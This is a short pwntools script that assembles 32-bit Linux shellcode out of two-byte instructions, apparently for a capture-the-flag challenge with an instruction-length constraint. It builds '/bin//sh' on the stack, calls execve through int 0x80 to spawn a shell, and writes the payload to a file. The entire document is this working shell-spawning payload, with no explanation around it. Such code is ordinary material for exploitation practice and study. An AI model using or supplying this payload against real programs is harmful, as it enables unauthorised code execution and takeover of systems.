from pwn import *

context.update(arch='i386', os='linux', endian='little')

payload = []

payload += [asm('xor esi, esi')]
payload += [asm('push esi') + b'\x90']

payload += [asm('mov al, 0x68')]
payload += [asm('shl eax, 1')] * 8
payload += [asm('mov al, 0x73')]
payload += [asm('shl eax, 1')] * 8
payload += [asm('mov al, 0x2f')]
payload += [asm('shl eax, 1')] * 8
payload += [asm('mov al, 0x2f')]

payload += [asm('push eax') + b'\x90']

payload += [asm('mov al, 0x6e')]
payload += [asm('shl eax, 1')] * 8
payload += [asm('mov al, 0x69')]
payload += [asm('shl eax, 1')] * 8
payload += [asm('mov al, 0x62')]
payload += [asm('shl eax, 1')] * 8
payload += [asm('mov al, 0x2f')]

payload += [asm('push eax') + b'\x90']

payload += [asm('mov ebx, esp')]
payload += [asm('xor eax, eax')]
payload += [asm('push 11')]
payload += [asm('pop eax') + b'\x90']
payload += [asm('xor edx, edx')]
payload += [asm('xor ecx, ecx')]
payload += [asm('int 0x80')]

for p in payload:
    assert len(p) == 2

payload = b''.join(payload)
print('FINAL')
print(payload)

with open('payload', 'wb') as fp:
    fp.write(payload + b'\n')
